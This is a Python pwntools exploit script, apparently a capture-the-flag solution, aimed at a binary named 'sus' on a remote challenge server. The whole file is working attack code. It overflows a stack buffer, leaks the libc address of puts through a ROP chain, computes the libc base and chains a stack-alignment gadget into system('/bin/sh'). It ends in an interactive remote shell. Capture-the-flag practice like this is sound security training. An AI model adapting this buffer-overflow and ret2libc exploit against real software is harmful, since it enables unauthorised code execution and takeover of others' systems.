from pwn import *

context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'x86_64'

target = './sus'
target_elf = ELF(target)
libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# io = process(target)
# io = gdb.debug(target, gdbscript='''
# break *(main+90)
# continue
# ''')
io = remote('chall.lac.tf', 31284)

rop1 = ROP([target_elf])
rop1.call('puts')
rop1.call('main')
info(rop1.dump())
rop_chain = rop1.chain()
io.recvrepeat(1)
# sus function acts as 'pop rdi' gadget
io.sendline(cyclic(56) + p64(target_elf.got['puts']) + p64(0xdeadbeef) + rop_chain)
leak = io.recvline()
info(leak)
libc_puts = u64(leak.strip().ljust(8, b"\x00"))
info(f"{hex(libc_puts)=}")

libc.address = libc_puts - libc.symbols['puts']
info(f"{hex(libc.address)=}")

rop2 = ROP([target_elf, libc])
rop2.raw(rop2.find_gadget(['ret'])) # padding for stack 16-byte alignment
rop2.system(next(libc.search(b'/bin/sh\x00')))
info(rop2.dump())
rop_chain = rop2.chain()

io.recvrepeat(1)
io.sendline(cyclic(64) + p64(target_elf.got['puts']+0x38) + rop_chain)
info(io.recvrepeat(1))
io.interactive()
